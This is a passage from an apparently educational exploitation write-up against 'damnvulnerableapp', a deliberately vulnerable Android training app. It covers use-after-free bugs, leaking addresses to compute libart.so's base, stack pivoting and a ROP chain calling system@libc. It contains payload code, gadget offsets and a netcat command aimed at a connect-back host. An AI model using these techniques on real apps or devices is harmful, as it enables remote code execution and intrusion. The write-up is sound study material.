</span></span><span class=line><span class=cl>    <span class=nf>execv</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Therefore, only the first parameter needs to be a global variable. The second one can be <code>NULL</code>! But we <strong>cannot</strong> trigger execution of arbitrary commands, as they would need parameters. If we were able to drop an executable file on the device, we could be able to execute this file assuming the app is granted enough permissions to access the executable.</p><p>Seeing that the above approaches do not work or, which is more likely, are very time consuming, I decided to change the type of the vulnerability from a <em>Write - What - Where</em> condition to an <em>Execute</em> condition.</p><h2 id=exploitation-of-useafterfreeexecmodule>Exploitation of <em>UseAfterFreeExecModule</em></h2><p>The issue with this module is not just the leak (which is the same as in <em>UseAfterFreeWriteModule</em>), but also the implementation of the key - value storage function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>obj</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=p>(</span><span class=n>code</span> <span class=o>**</span><span class=p>)((</span><span class=kt>long</span><span class=p>)</span><span class=n>obj</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>=</span> <span class=n>FUN_00100c60</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nf>free</span><span class=p>(</span><span class=n>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>keyValue</span> <span class=o>=</span> <span class=p>(</span><span class=n>object</span> <span class=o>*</span><span class=p>)</span><span class=nf>calloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x108</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>nameLength</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetArrayLength</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>len</span> <span class=o>=</span> <span class=p>(</span><span class=n>uint</span><span class=p>)</span><span class=n>nameLength</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=mh>0x100</span> <span class=o>&lt;</span> <span class=n>len</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>len</span> <span class=o>=</span> <span class=mh>0x100</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>iscopy</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>nameBytes</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>GetByteArrayElements</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>name</span><span class=p>,</span><span class=o>&amp;</span><span class=n>iscopy</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>__memcpy_chk</span><span class=p>(</span><span class=n>keyValue</span><span class=p>,</span><span class=n>nameBytes</span><span class=p>,</span><span class=n>len</span><span class=p>,</span><span class=mh>0xffffffffffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>keyValue</span><span class=o>-&gt;</span><span class=n>value</span> <span class=o>=</span> <span class=n>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=o>**</span><span class=p>(</span><span class=n>code</span> <span class=o>**</span><span class=p>)((</span><span class=kt>long</span><span class=p>)</span><span class=n>obj</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>))(</span><span class=n>keyValue</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>resultLength</span> <span class=o>=</span> <span class=nf>__strlen_chk</span><span class=p>(</span><span class=o>&amp;</span><span class=n>result</span><span class=p>,</span><span class=mh>0xffffffffffffffff</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>array</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>NewByteArray</span><span class=p>)(</span><span class=n>env</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>resultLength</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>SetByteArrayRegion</span><span class=p>)(</span><span class=n>env</span><span class=p>,</span><span class=n>array</span><span class=p>,</span><span class=mi>0</span><span class=p>,(</span><span class=n>jsize</span><span class=p>)</span><span class=n>resultLength</span><span class=p>,(</span><span class=n>jbyte</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>In itself, only the fact that <code>obj</code> is reused to call the function at <code>obj + 0x100</code> seems to be an issue. Seeing that <code>malloc(0x108)</code> and <code>calloc(1, 0x108)</code> both allocate <code>0x108</code> bytes, we can deduce (just as <a href=#introducing-scudo-the-allocator>before</a>
) that the same chunk is returned.</p><p>Now we just have to exploit this&mldr;</p><h3 id=finding-a-better-obj--0x100>Finding a better <em>obj + 0x100</em></h3><p>From <a href=#leaking-data>the first section</a>
we get a bunch of pointers. E.g. this might look like this:</p><pre tabindex=0><code>[0]: 0x730b9d3c874e     &lt;-- ptr: &#34;amazing_key&#34;
[1]: 0x730b9d3c875a     &lt;-- ptr: &#34;secret_key&#34;
[2]: 0x730b9d3c8740     &lt;-- ptr: &#34;topsecret_key&#34;
[3]: 0x730b9d3c8765     &lt;-- ptr: &#34;a_very_very_long_key_with_fancy_features_:D&#34;
[4]: 0x730b9afdf9a0     &lt;-- stack address: most likely examples
[5]: 0x2147eb93990de82b &lt;-- looks more like a canary
[6]: 0x730b9afdf8d0     &lt;-- stack address: stored rbp
[7]: 0x730c0379ffac     &lt;-- return address
</code></pre><p>The first five addresses can be understood if one analyses <code>lookupExamples</code>. The canary is often just a <a href=https://link.springer.com/article/10.1007/s10207-018-00425-8 target=_blank rel=noopener>random 8 - byte value</a>
that is pushed between a stack frame and the local variables. Depending on the canary type, this can be a terminator - canary, i.e. it contains e.g. a null - byte, or something else. On Android, it is a <a href=https://link.springer.com/article/10.1007/s10207-018-00425-8 target=_blank rel=noopener>random canary</a>
. Disassembling <code>lookupExamples</code> yields</p><pre tabindex=0><code>gef➤  disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples 
    0x0000730b9d3c8990 &lt;+0&gt;:	push   rbp
    0x0000730b9d3c8991 &lt;+1&gt;:	mov    rbp,rsp
    0x0000730b9d3c8994 &lt;+4&gt;:	sub    rsp,0x70
    0x0000730b9d3c8998 &lt;+8&gt;:	mov    rax,QWORD PTR fs:0x28
    0x0000730b9d3c89a1 &lt;+17&gt;:	mov    QWORD PTR [rbp-0x8],rax 
    ...
</code></pre><p>and therefore the stack layout is as described above.</p><p>The problem is that we want to execute e.g. <code>execve</code> or similar, but this function is not referenced in the module itself. This is where the return address comes into play. On my machine, <code>art_quick_generic_jni_trampoline</code> is the function that calls <code>lookupExamples</code>. This may depend on, among other things, the way the function is specified in the java code, i.e. it could be static or non - static. In this case, the return address is <code>art_quick_generic_jni_trampoline+220</code>.</p><p>Running</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ readelf --wide --symbols libart.so <span class=p>|</span> grep art_quick_generic_jni_trampoline
</span></span><span class=line><span class=cl>  7145: 000000000039fed0   <span class=m>378</span> FUNC    LOCAL  HIDDEN    <span class=m>14</span> art_quick_generic_jni_trampoline
</span></span></code></pre></div><p>gives the offset <code>0x39fed0</code>. Thus, the base address (mind <em>ASLR</em>) of <code>libart.so</code> is</p><pre tabindex=0><code>0x730c0379ffac - 220 - 0x39fed0 = 0x730c03400000
</code></pre><p>From now on, all code in <code>libart.so</code> is also available to us. Remember that we can overwrite a function pointer, whose function is called with <strong>two</strong> parameters</p><ol><li><code>keyValue</code>: pointer to a user - controlled string</li><li><code>&lt;unknown></code>: <code>NULL</code></li></ol><p>We could gamble and hope that <code>execve</code> works here, but most likely it will not. We again do not control enough parameters. Notice that looking for similar functions yields</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ readelf --wide --symbols libart.so <span class=p>|</span> grep <span class=s2>&#34;exec&#34;</span>
</span></span><span class=line><span class=cl>   199: <span class=m>0000000000000000</span>     <span class=m>0</span> FUNC    GLOBAL DEFAULT  UND execv@LIBC <span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>   200: <span class=m>0000000000000000</span>     <span class=m>0</span> FUNC    GLOBAL DEFAULT  UND execve@LIBC <span class=o>(</span>2<span class=o>)</span>
</span></span><span class=line><span class=cl>   271: <span class=m>0000000000000000</span>     <span class=m>0</span> FUNC    GLOBAL DEFAULT  UND _ZN3art10DupCloexecEi
</span></span><span class=line><span class=cl>  1304: <span class=m>0000000000000000</span>     <span class=m>0</span> FILE    LOCAL  DEFAULT  ABS exec_utils.cc
</span></span><span class=line><span class=cl>  8795: <span class=m>0000000000000000</span>     <span class=m>0</span> FUNC    GLOBAL DEFAULT  UND execv
</span></span><span class=line><span class=cl>  8796: <span class=m>0000000000000000</span>     <span class=m>0</span> FUNC    GLOBAL DEFAULT  UND execve
</span></span><span class=line><span class=cl> 10033: <span class=m>0000000000000000</span>     <span class=m>0</span> FUNC    GLOBAL DEFAULT  UND _ZN3art10DupCloexecEi
</span></span></code></pre></div><p>Looking up <code>execv</code> reveals</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>int</span> <span class=nf>execv</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>pathname</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=k>const</span> <span class=n>argv</span><span class=p>[]);</span>
</span></span></code></pre></div><p>This time, lets try to at least get to the point where we can execute an arbitrary executable file that we provided, as is described in a <a href=#alternative-idea-for-exploitation-of-useafterfreewritemodule>previous section</a>
.</p><p>The attentive reader might have noticed that <code>execv</code> does not have any offset, i.e. an offset of 0. Thus it will be resolved when the dynamic linker loads <code>libart.so</code>. To solve that issue, we just have to figure out to which location a call to <code>execv</code> transfers control. Introducing: <code>.plt</code>!</p><p>One way to find the offset and thus the address of <code>execv</code> is to search for calls of <code>execv</code> in the binary. It turns out that <code>ExecWithoutWait</code> calls <code>execv</code>. Disassembling it yields:</p><pre tabindex=0><code>$ readelf --wide --symbols libart.so | grep ExecWithoutWait
    1305: 00000000004b6ac0   560 FUNC    LOCAL  DEFAULT   14 _ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE
gef➤  disassemble 0x4b6ac0 + 0x730c03400000
    ...
    0x0000730c038b6bf8 &lt;+312&gt;:	mov    rsi,QWORD PTR [rsp+0x20]
    0x0000730c038b6bfd &lt;+317&gt;:	mov    rdi,r14
    0x0000730c038b6c00 &lt;+320&gt;:	call   0x730c03e08f80   &lt;--- symbol stub for execv
    0x0000730c038b6c05 &lt;+325&gt;:	jmp    0x730c038b6c14 &lt;_ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE+340&gt;
    ...
</code></pre><p>As we know the base address of <code>libart.so</code>, we can compute <code>0x730c03e08f80 - 0x730c03400000 = 0xa08f80</code>. If we uploaded a test client shell script that connects to <code>10.0.2.2:4444</code>, chose <code>key = "/data/local/tmp/client"</code> and <code>value=&lt;address of execv></code>, we would expect to get a connection&mldr;but unfortunately, execution gets denied with an error:</p><pre tabindex=0><code>/com.damnvulnerableapp W/Thread-2: type=1400 audit(0.0:3799): avc: denied { execute } for name=&#34;client&#34; dev=&#34;dm-5&#34; ino=65602 scontext=u:r:untrusted_app:s0:c152,c256,c512,c768 tcontext=u:object_r:shell_data_file:s0 tclass=file permissive=0 app=com.damnvulnerableapp
</code></pre><h3 id=trying-to-earn-all-the-fruits>Trying to earn all the fruits</h3><p>As you may have noticed, the above does not really help other than crashing the app. What we want is <strong>arbitrary code execution</strong>!!! Thus, we can try to transform the above UAF vulnerability into another vulnerability, e.g. a format string vulnerability that is easier to exploit!</p><p>Observe that there is a function called <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:system/libbase/stringprintf.cpp;l=68" target=_blank rel=noopener><code>StringPrintf</code></a>
:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>StringPrintf</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>fmt</span><span class=p>,</span> <span class=p>...)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>va_list</span> <span class=n>ap</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>va_start</span><span class=p>(</span><span class=n>ap</span><span class=p>,</span> <span class=n>fmt</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>std</span><span class=o>::</span><span class=n>string</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>StringAppendV</span><span class=p>(</span><span class=o>&amp;</span><span class=n>result</span><span class=p>,</span> <span class=n>fmt</span><span class=p>,</span> <span class=n>ap</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>va_end</span><span class=p>(</span><span class=n>ap</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>which is a perfect target as we fully control the content of <code>key</code>! Using the same trick as above or by just disassembling the whole <code>.plt</code> and searching for <code>StringPrintf</code> will reveal that its offset is <code>0xa08570</code> (in <code>.plt</code>). Notice that <code>StringPrintf</code> internally calls <code>StringAppendV</code>, which again calls <code>vsnprintf</code>.</p><p>Therefore, set <code>key=&lt;format string></code> and <code>value=address of StringPrintf@plt</code>.</p><p>Testing this reveals that we might be able to use format strings like &ldquo;%4242x&rdquo;, but not &ldquo;%4242x%n&rdquo;, because of the implementation of <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/libc/stdio/vfprintf.cpp;l=454;bpv=0;bpt=1" target=_blank rel=noopener><code>vfprintf</code></a>
:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>case</span> <span class=sc>&#39;n&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nf>__fortify_fatal</span><span class=p>(</span><span class=s>&#34;%%n not allowed on Android&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Also, for the above to work, we would need to adjust the call to <code>obj + 0x100</code> like:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>char</span> <span class=n>buffer</span><span class=p>[</span><span class=mi>32</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=p>(</span><span class=n>obj</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>keyValue</span><span class=p>);</span>
</span></span></code></pre></div><p>because <code>StringPrintf</code> silently assumes that <code>rdi</code> is an address to a variable that has to store a result of <code>24</code> bytes and <code>rsi</code> is the format string. If we did not make the above change, then <code>StringPrintf</code> would zero out the first <code>24</code> bytes of our format string, thus completely shutting down the attack. Adding to the pile, we do not have any control over addresses that are accessible via direct parameter access. To be precise, we would need to be lucky enough to find any addresses of interest on the stack like e.g. the format string itself.</p><p>Another idea could be to call <code>dlopen</code> to get a reference to another library that provides more interesting functionality like <code>system</code>! The offset of the <code>.plt</code> - entry that calls <code>dlopen</code> is <code>0xa096b0</code>. Thus we can compute the overall virtual address. Unfortunately, this is shut down by the fact that <code>dlopen</code> returns a random <code>8</code> - byte value that is a key into a dictionary, whose values are the actual addresses of <code>soinfo</code> - structures, which again contain the base addresses. So it is pretty unlikely to get this right, the best we could do here is either guessing or trying to leak the dictionary via a global variable.</p><h3 id=finally-the-solution>Finally: the solution</h3><p>Another approach is to try to exploit this UAF vulnerability via a ROP - chain. This is a very destructive approach, but lets see through this:</p><ol><li>Find a gadget that, right before the call of our <code>obj + 0x100</code> function, modifies the stack in such a way that it will return to <code>keyValue</code>.</li><li>Put ROP - chain into <code>keyValue</code>. We may use at most <code>256 // 8 = 32</code> qwords. This might be sufficient to leak a <code>libc.so</code> address into a global variable in <code>libart.so</code>. It will turn out that this even suffices to get arbitrary, limited - length command execution.</li><li>Finally restore the old <code>rsp</code> and <code>rbp</code>. This would be necessary for a stealthy approach. Restoring <code>rsp</code> is only really important for calling <code>system</code>, because if <code>rsp</code> points into <code>keyValue</code>, which is located on the heap, <code>system</code> will allocate alot of memory from the heap as if it was a stack, therefore going out-of-bounds fast.</li></ol><p>So, the gadget of choice is located at <code>0x39509a</code> and is of the form:</p><pre tabindex=0><code>gef➤  x/10i 0x730c03400000 + 0x39509a
    0x730c0379509a &lt;art_quick_do_long_jump+106&gt;:	pop    rdi
    0x730c0379509b &lt;art_quick_do_long_jump+107&gt;:	pop    rsi
    0x730c0379509c &lt;art_quick_do_long_jump+108&gt;:	pop    rbp
    0x730c0379509d &lt;art_quick_do_long_jump+109&gt;:	add    rsp,0x8
    0x730c037950a1 &lt;art_quick_do_long_jump+113&gt;:	pop    rbx
    0x730c037950a2 &lt;art_quick_do_long_jump+114&gt;:	pop    rdx
    0x730c037950a3 &lt;art_quick_do_long_jump+115&gt;:	pop    rcx
    0x730c037950a4 &lt;art_quick_do_long_jump+116&gt;:	pop    rax
    0x730c037950a5 &lt;art_quick_do_long_jump+117&gt;:	pop    rsp
    0x730c037950a6 &lt;art_quick_do_long_jump+118&gt;:	ret
</code></pre><p>We can use the debugger to figure out how many qwords we need to pop in order for the <code>ret</code> - instruction to return to <code>keyValue</code>:</p><pre tabindex=0><code>gef➤  disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair
    ...
    0x0000730b9d3c8b5c &lt;+252&gt;:	mov    rax,QWORD PTR [rbp-0x70]
    0x0000730b9d3c8b60 &lt;+256&gt;:	mov    rax,QWORD PTR [rax+0x100]
    0x0000730b9d3c8b67 &lt;+263&gt;:	mov    rdi,QWORD PTR [rbp-0x78]   &lt;--- keyValue
    0x0000730b9d3c8b6b &lt;+267&gt;:	xor    ecx,ecx
    0x0000730b9d3c8b6d &lt;+269&gt;:	mov    DWORD PTR [rbp-0xac],ecx
    0x0000730b9d3c8b73 &lt;+275&gt;:	mov    esi,ecx
=&gt;  0x0000730b9d3c8b75 &lt;+277&gt;:	call   rax      &lt;--- execution condition
    ...
gef➤  x/1gx $rbp-0x78
    0x730b9afdf818:	0x0000730cb77bb950
gef➤  x/10gx $rsp
0x730b9afdf7e0:	0x00000000990de82b	0x0000730d778087d0
0x730b9afdf7f0:	0x0000730b9afdfb00	0x0000730d77808880
0x730b9afdf800:	0x0000730b9afdfd60	0x0000730ca77f2750
0x730b9afdf810:	0x000000d09afdf8b0	0x0000730cb77bb950  &lt;--- this is keyValue
0x730b9afdf820:	0x0000730cb77bb950	0x0000730c0379509c
</code></pre><p>So when we run into <code>call rax</code>, we push an additional return address onto the stack. Therefore we need to pop <code>1 + 7</code> qwords from the stack before we can shift the stack into <code>keyValue</code> and hit <code>ret</code>. So we need <code>rsp</code> to be <code>keyValue</code>, then the stack &ldquo;changes&rdquo; to our controlled ROP - chain. Therefore we can make use the <em>Execute</em> condition to run the above gadget, which will then trigger execution of the gadgets located in <code>keyValue</code>.</p><p>Now we will try to leak a <code>libc.so</code> address into a global variable in <code>libart.so</code>. This allows us to compute the <code>libc.so</code> base address, which in turn allows us to call <code>system</code> (the holy grail)! To that end, we will try to find a <code>libc.so</code> address in <code>libart.so</code>. The <code>.got.plt</code> is the best place to start looking. As Android&rsquo;s dynamic linker likes loading shared objects with <code>BIND_NOW</code> (which is probably motivated by <em>RELRO</em>), the <code>.got.plt</code> is already populated with the correct function addresses. This implies that the <code>.got.plt</code> entry of <code>_exit</code> contains the actual address of <code>_exit</code> in the <code>libc.so</code>. Computing the offset of <code>_exit</code>&rsquo;s <code>.got.plt</code> entry yields <code>0xc1be50</code> (we could use any other function from <code>libc.so</code>; <code>_exit</code> was chosen arbitrarily).</p><p>Observe that we only need 6 qwords to leak <code>system</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Leak exit@libc into rax</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rdi</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>address_got_plt_exit</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_rax_deref_rdi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Put system@libc into rax</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rcx</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset__exit</span> <span class=o>-</span> <span class=n>offset_system</span><span class=p>)</span> <span class=c1># --&gt; offset__exit &gt;= offset_system (just testing)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_sub_rax_rcx</span>
</span></span></code></pre></div><p>After the above, <code>rax</code> will contain the address of <code>system@libc</code>. Setting up the command to execute can be done by writing to a writable memory area in <code>libart.so</code> (hope that this does not crash; otherwise choose another area until it works). Writing the command could look like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rdi</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>address_writable_memory</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rcx</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;nc 10.0.&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_deref_rdi_rcx</span>
</span></span></code></pre></div><p>Finally, we want to call <code>system@libc</code>, whose address is stored in <code>rax</code>. The main problem here is that just calling <code>system</code> will most likely crash the app, because <code>rsp</code> still points into the heap. If <code>system</code> uses a lot of stack memory, this will eventually invalidate heap chunks or trigger <em>anti - out - of - bounds</em> security mechanisms. Therefore, we need to restore <code>rsp</code> s.t. it points into a sufficiently large memory area that is assumed to be used by &ldquo;user - code&rdquo;, i.e. e.g. the original stack. Observe that the <a href=#leaking-data>leaked addresses</a>
contained a stack pointer. We can go ahead and write the address of <code>system@libc</code> into that address and then restore the stack with a <code>pop rsp; ret</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Write address of system@got.plt to stack address. rdi currently contains the command string!</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rcx</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>address_stack</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_mov_deref_rcx_rax</span> <span class=c1># &lt;-- rax = system@libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Restore stack. This gadget implicitly calls system</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>gadget_pop_rsp</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>address_stack</span>
</span></span></code></pre></div><p>This exploit is <strong>very</strong> specific to this module, but it uses a technique that shifts the stack into a user - controlled memory region s.t. successive <code>ret</code> - instructions result in execution of ROP - gadgets.</p><h2 id=coming-back-from-useafterfreeexecmodule>Coming back from <em>UseAfterFreeExecModule</em></h2><p>The technique used to exploit the UAF vulnerability in the <em>UseAfterFreeExecModule</em> might be applicable to <em>libUseAfterFreeWriteModule</em> aswell. General steps are:</p><ol><li>Setup a ROP - chain in readable/writeable memory area. In this case, this will be in a shared memory region somewhere is <code>libart.so</code>.</li><li>Next, overwrite <code>rsp</code> to point to the above mentioned memory region. Then immediately return using <code>ret</code>.</li><li>Enjoy the ROP - chain</li></ol><p>It turns out that this does not work by itself. As we can only write one qword in each function call, we can either overwrite the return address to trigger execution of e.g. a gadget or set the stack pointer, but <strong>not</strong> both at once. Therefore, we need to do a little magic to make things work.</p><p>The key observation is that <code>rbp</code> is often used to restore <code>rsp</code> in function epilogues. This is precisely what happens in the caller of <code>storePair</code>! See the following assembly of <code>storePair</code>:</p><pre tabindex=0><code>gef➤  disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair 
    ...
    0x0000730b9ed59abd &lt;+205&gt;:	mov    rcx,QWORD PTR [rbp-0x50]
    0x0000730b9ed59ac1 &lt;+209&gt;:	mov    rax,QWORD PTR [rbp-0x58]
    0x0000730b9ed59ac5 &lt;+213&gt;:	mov    rax,QWORD PTR [rax]
    0x0000730b9ed59ac8 &lt;+216&gt;:	mov    QWORD PTR [rax],rcx      &lt;--- write - what - where condition
    0x0000730b9ed59acb &lt;+219&gt;:	mov    rdi,QWORD PTR [rbp-0x38]
    0x0000730b9ed59acf &lt;+223&gt;:	mov    rax,QWORD PTR [rdi]
    0x0000730b9ed59ad2 &lt;+226&gt;:	mov    rax,QWORD PTR [rax+0x600]
    0x0000730b9ed59ad9 &lt;+233&gt;:	mov    rsi,QWORD PTR [rbp-0x48]
    0x0000730b9ed59add &lt;+237&gt;:	mov    rdx,QWORD PTR [rbp-0x70]
    0x0000730b9ed59ae1 &lt;+241&gt;:	mov    ecx,0x2
    0x0000730b9ed59ae6 &lt;+246&gt;:	call   rax
    0x0000730b9ed59ae8 &lt;+248&gt;:	mov    rdi,QWORD PTR [rbp-0x60]
    0x0000730b9ed59aec &lt;+252&gt;:	call   0x730b9ed59b90 &lt;free@plt&gt;
    0x0000730b9ed59af1 &lt;+257&gt;:	mov    rax,QWORD PTR fs:0x28
    0x0000730b9ed59afa &lt;+266&gt;:	mov    rcx,QWORD PTR [rbp-0x8]
    0x0000730b9ed59afe &lt;+270&gt;:	cmp    rax,rcx
    0x0000730b9ed59b01 &lt;+273&gt;:	jne    0x730b9ed59b0d &lt;Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair+285&gt;
    0x0000730b9ed59b07 &lt;+279&gt;:	add    rsp,0x70
    0x0000730b9ed59b0b &lt;+283&gt;:	pop    rbp               &lt;--- restore old rbp of calling function
    0x0000730b9ed59b0c &lt;+284&gt;:	ret    
</code></pre><p>It is clear that in between the <em>Write - What - Where</em> condition and the <code>pop rbp</code> - instruction there are no references to the stored old <code>rbp</code> of the calling function. Therefore, we can &ldquo;safely&rdquo; overwrite it. But why would we do this? Consider what happens after we return from <code>storePair</code>:</p><pre tabindex=0><code>gef➤  x/35i 0x0000730c0379ffa9
    0x730c0379ffa9:	call   r11
    0x730c0379ffac:	mov    rdi,QWORD PTR gs:0xe0    &lt;--- we return here
    0x730c0379ffb5:	mov    rsi,rax
    0x730c0379ffb8:	movq   rdx,xmm0
    0x730c0379ffbd:	call   0x730c03d62b00 &lt;artInvokeInterfaceTrampolineWithAccessCheck+208&gt;
    0x730c0379ffc2:	mov    rcx,QWORD PTR gs:0xa0
    0x730c0379ffcb:	test   rcx,rcx
    0x730c0379ffce:	jne    0x730c037a0034 &lt;art_quick_read_barrier_mark_reg02+116&gt;
    0x730c0379ffd0:	mov    rsp,rbp                  &lt;--- how convenient!
    0x730c0379ffd3:	movq   xmm1,QWORD PTR [rsp+0x18]
    0x730c0379ffd9:	movq   xmm2,QWORD PTR [rsp+0x20]
    0x730c0379ffdf:	movq   xmm3,QWORD PTR [rsp+0x28]
    0x730c0379ffe5:	movq   xmm4,QWORD PTR [rsp+0x30]
    0x730c0379ffeb:	movq   xmm5,QWORD PTR [rsp+0x38]
    0x730c0379fff1:	movq   xmm6,QWORD PTR [rsp+0x40]
    0x730c0379fff7:	movq   xmm7,QWORD PTR [rsp+0x48]
    0x730c0379fffd:	movq   xmm12,QWORD PTR [rsp+0x50]
    0x730c037a0004:	movq   xmm13,QWORD PTR [rsp+0x58]
